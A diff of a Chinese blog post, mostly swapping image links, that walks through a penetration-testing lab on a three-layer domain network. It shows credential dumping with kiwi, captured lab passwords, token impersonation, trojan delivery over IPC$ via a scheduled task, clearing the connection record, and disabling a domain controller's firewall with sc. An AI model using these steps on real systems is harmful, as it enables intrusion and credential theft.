-<p><img src="https://img-blog.csdnimg.cn/9dd2a2c725b944f399071251d0b1c713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9dd2a2c725b944f399071251d0b1c713.png"></p>
 <h1 id="三层网络信息收集"><a href="#三层网络信息收集" class="headerlink" title="三层网络信息收集"></a>三层网络信息收集</h1><h2 id="降权"><a href="#降权" class="headerlink" title="降权"></a>降权</h2><p>先看一下权限</p>
-<p><img src="https://img-blog.csdnimg.cn/b56f595b3d0843c4bb63d76f8e8d27d4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>System权限，为了方便信息收集，将当前权限降为普通域用户，因为不是域用户没有权限执行域命令</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b56f595b3d0843c4bb63d76f8e8d27d4.png"><br>System权限，为了方便信息收集，将当前权限降为普通域用户，因为不是域用户没有权限执行域命令</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getuid &#x2F;&#x2F;查看当前token</span><br><span class="line">use incognito &#x2F;&#x2F;加载incognito</span><br><span class="line">list_tokens -u &#x2F;&#x2F;列出accesstoken</span><br><span class="line">impersonate_token &quot;DEMO\douser&quot;  &#x2F;&#x2F;模拟&quot;DEMO\douser”用户</span><br><span class="line">rev2self  &#x2F;&#x2F;返回之前的accesstoken权限</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/04f48daef0414c1ba373b9c1ac2b9286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>降权成功</p>
-<p><img src="https://img-blog.csdnimg.cn/b7fd5c8867d447baa2f26f09c1ddcef4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>进入shell失败，那么 <code>进程迁移到域用户</code>，这里迁移了好几个都是system权限，还得多学习这方面</p>
-<p><img src="https://img-blog.csdnimg.cn/026e2ebdeb0f470993bfe597570d84fc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//04f48daef0414c1ba373b9c1ac2b9286.png"><br>降权成功</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b7fd5c8867d447baa2f26f09c1ddcef4.png"><br>进入shell失败，那么 <code>进程迁移到域用户</code>，这里迁移了好几个都是system权限，还得多学习这方面</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//026e2ebdeb0f470993bfe597570d84fc.png"></p>
 <h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>利用域用户进行信息收集</p>
-<p><img src="https://img-blog.csdnimg.cn/5e0f994fd9334d6aa9520fef3e9deeaa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>域用户</p>
-<p><img src="https://img-blog.csdnimg.cn/cc5fb2abf6af4f00916453387f74d3bf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>域内机器</p>
-<p><img src="https://img-blog.csdnimg.cn/e77e5652e9b744f18af11ec5ea0f86e7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>域内其他主机名：</p>
-<p><img src="https://img-blog.csdnimg.cn/bc3ae6daecb44b3b82f6695cb0d94be3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>域控列表</p>
-<p><img src="https://img-blog.csdnimg.cn/dc11dcb9bf074a748f8d75f5a4cb74d9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>域控ip</p>
-<p><img src="https://img-blog.csdnimg.cn/456757690554447086f35d1d68ffdccc.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>域管</p>
-<p><img src="https://img-blog.csdnimg.cn/7fe47b85a98244938ffb2118a26672be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>整理：当前PC1(192.168.93.20)存在域环境，域控DC(192.168.93.30)和PC2(192.168.93.40)  域管账户为administrator</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5e0f994fd9334d6aa9520fef3e9deeaa.png"><br>域用户</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc5fb2abf6af4f00916453387f74d3bf.png"><br>域内机器</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e77e5652e9b744f18af11ec5ea0f86e7.png"><br>域内其他主机名：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//bc3ae6daecb44b3b82f6695cb0d94be3.png"><br>域控列表</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dc11dcb9bf074a748f8d75f5a4cb74d9.png"><br>域控ip</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//456757690554447086f35d1d68ffdccc.png"><br>域管</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fe47b85a98244938ffb2118a26672be.png"><br>整理：当前PC1(192.168.93.20)存在域环境，域控DC(192.168.93.30)和PC2(192.168.93.40)  域管账户为administrator</p>
 <h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p>因为抓密码要system权限，所以我们再打一个system权限</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/6da88b4814044d39b8f8048caea0cae9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>抓取到密码：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//6da88b4814044d39b8f8048caea0cae9.png"><br>抓取到密码：</p>
 <blockquote>
 <p>bunny:Bunny2021<br>administrator:Whoami2021</p>
 </blockquote>
 <p>开启3389</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/5fc0111ed76f4b86927207d8b9266570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5fc0111ed76f4b86927207d8b9266570.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u bunny -p &quot;Bunny2021&quot; 192.168.52.30</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/9d82071875e9491a891573cbdea27aae.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>失败</p>
-<p><img src="https://img-blog.csdnimg.cn/0a63b81c38e94316ba87add67ad126aa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9d82071875e9491a891573cbdea27aae.png"><br>失败</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0a63b81c38e94316ba87add67ad126aa.png"></p>
 <h1 id="三层网络渗透"><a href="#三层网络渗透" class="headerlink" title="三层网络渗透"></a>三层网络渗透</h1><p>接下来就是王第三层网络进行渗透</p>
 <p>添加路由</p>
-<p><img src="https://img-blog.csdnimg.cn/2ada0f0b4d604f279ecacea0d1490916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>探测windows版本：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2ada0f0b4d604f279ecacea0d1490916.png"><br>探测windows版本：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/42fc36db087548d3b2b90920cd5dbe9d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//42fc36db087548d3b2b90920cd5dbe9d.png"></p>
 <p>Ms17-010</p>
 <p>先打win7(PC2)失败</p>
-<p><img src="https://img-blog.csdnimg.cn/e9fc04d47e5b48cbab8aad3f04330061.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e9fc04d47e5b48cbab8aad3f04330061.png"></p>
 <p>我看师傅们都是利用17_010来上线的，打的时候经常断掉，因为抓取过域管密码，所以尝试 <code>ipc</code></p>
 <h2 id="IPC"><a href="#IPC" class="headerlink" title="$IPC"></a>$IPC</h2><p>建立ipc连接</p>
-<p><img src="https://img-blog.csdnimg.cn/4dfe2f47d95d4bbfa759dca4906fed1f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>生成木马：</p>
-<p><img src="https://img-blog.csdnimg.cn/d0710ced3002422888bef520910d9f3e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>上传到PC1    </p>
-<p><img src="https://img-blog.csdnimg.cn/83767830d60e47a697f16aea593f6e95.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>共享到PC2</p>
-<p><img src="https://img-blog.csdnimg.cn/48124d1729b54dbf966914ab0415a6a1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>计划任务开启：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4dfe2f47d95d4bbfa759dca4906fed1f.png"><br>生成木马：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d0710ced3002422888bef520910d9f3e.png"><br>上传到PC1    </p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//83767830d60e47a697f16aea593f6e95.png"><br>共享到PC2</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//48124d1729b54dbf966914ab0415a6a1.png"><br>计划任务开启：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.93.40 16:45 c:\houmen.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/0693a37257e64f9ea776866dd160f4c1.png#pic_center"><br>开启监听，成功上线：</p>
-<p><img src="https://img-blog.csdnimg.cn/77a62349712941489cec268835f475fd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>删除记录：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0693a37257e64f9ea776866dd160f4c1.png"><br>开启监听，成功上线：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//77a62349712941489cec268835f475fd.png"><br>删除记录：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>
 
 <h2 id="psexec-域控"><a href="#psexec-域控" class="headerlink" title="psexec-域控"></a>psexec-域控</h2><p>尝试域控</p>
 <p>Psexec试一下：</p>
-<p><img src="https://img-blog.csdnimg.cn/93ae7b9b9ffc4f14a69deace9a3b1637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>失败，原来是防火墙</p>
-<p><img src="https://img-blog.csdnimg.cn/738791180f0d45ea8d1b68772a3cdd3e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>再次尝试建立ipc并用sc命令关闭域控防火墙</p>
-<p><img src="https://img-blog.csdnimg.cn/66c9fec437c7444e8ab4aa882ea29d12.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//93ae7b9b9ffc4f14a69deace9a3b1637.png"><br>失败，原来是防火墙</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//738791180f0d45ea8d1b68772a3cdd3e.png"><br>再次尝试建立ipc并用sc命令关闭域控防火墙</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c9fec437c7444e8ab4aa882ea29d12.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.93.30 create unablefirewall binpath&#x3D; “netsh advfirewall set allprofiles state off &#x2F;&#x2F;创建服务</span><br><span class="line">sc \\192.168.93.30 start unablefirewall &#x2F;&#x2F;启动服务</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/f1de3b7d8da04b6aa1463f61ce5e4bf3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>再打一遍成功上线：</p>
-<p><img src="https://img-blog.csdnimg.cn/fbba812767464392934d090eec8ae188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>这里当然也可以用ipc传马</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f1de3b7d8da04b6aa1463f61ce5e4bf3.png"><br>再打一遍成功上线：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fbba812767464392934d090eec8ae188.png"><br>这里当然也可以用ipc传马</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9574#toc-6">Vulnstack内网靶场渗透记录</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/264560.html">自主搭建的三层网络域渗透靶场打靶记录</a></p>
 
@@ -701,7 +707,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">107</span>
+          <span class="site-state-item-count">105</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
